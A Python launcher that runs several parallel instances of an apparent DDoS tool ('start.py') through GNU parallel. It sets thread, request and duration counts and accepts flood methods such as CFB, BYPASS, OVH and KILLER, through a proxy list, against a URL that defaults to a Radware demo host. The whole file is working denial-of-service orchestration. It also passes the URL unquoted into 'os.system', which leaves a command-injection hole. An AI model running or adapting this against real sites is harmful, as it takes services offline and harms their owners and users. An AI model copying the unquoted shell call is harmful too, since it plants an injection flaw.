import os
import datetime
import logging
import argparse

# Set up logging
DEBUG = 1  # Change this value to 0 to turn off debug logging
if DEBUG:
    logging.basicConfig(level=logging.DEBUG)
else:
    logging.basicConfig(level=logging.INFO)


def job(url, threads, requests, seconds, parallel_instances, types):
    logging.info(f"Running job at {datetime.datetime.now()}")

    # If there are more types than instances, raise an error.
    if len(types) > parallel_instances:
        raise ValueError("Too many type arguments compared to the number of parallel instances.")

    commands = []
    for i in range(parallel_instances):
        # Cycle through the types list to repeat types if needed
        type_ = types[i % len(types)]
        commands.append(f'python3 start.py {type_} {url} 1 {threads} http.txt {requests} {seconds}')

    # Create the full command using `parallel`
    command = f'parallel ::: {" ".join(commands)}'
    os.system(command)


# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("--threads", type=int, default=50, help="Number of threads to use per instance.")
parser.add_argument("--requests", type=int, default=100, help="Number of requests to send per thread.")
parser.add_argument("--seconds", type=int, default=100, help="Duration in seconds.")
parser.add_argument("--url", default="https://autodemo.radware.net", help="The URL to be used.")
parser.add_argument("--parallel-instances", type=int, default=4, help="Number of parallel instances to run.")
parser.add_argument("--types", default="HEAD,EVEN,COOKIE,POST", help="Comma-delimited list of types for each instance.")
args = parser.parse_args()

# Convert comma-delimited string to a list and convert to uppercase
types = [t.upper() for t in args.types.split(',')]

# List of allowed types
allowed_types = ["DOWNLOADER", "DYN", "BOMB", "STRESS", "XMLRPC", "GET", "HEAD", "AVB", "POST",
                 "SLOW", "BOT", "STOMP", "CFB", "APACHE", "BYPASS", "GSB", "TOR", "NULL", "DGB",
                 "RHEX", "OVH", "PPS", "CFBUAM", "EVEN", "COOKIE", "KILLER"]

# Check that all provided types are allowed
for t in types:
    if t not in allowed_types:
        raise ValueError(f"Invalid type: {t}. Make sure to only use types from the allowed list.")

# Run the job immediately
job(args.url, args.threads, args.requests, args.seconds, args.parallel_instances, types)
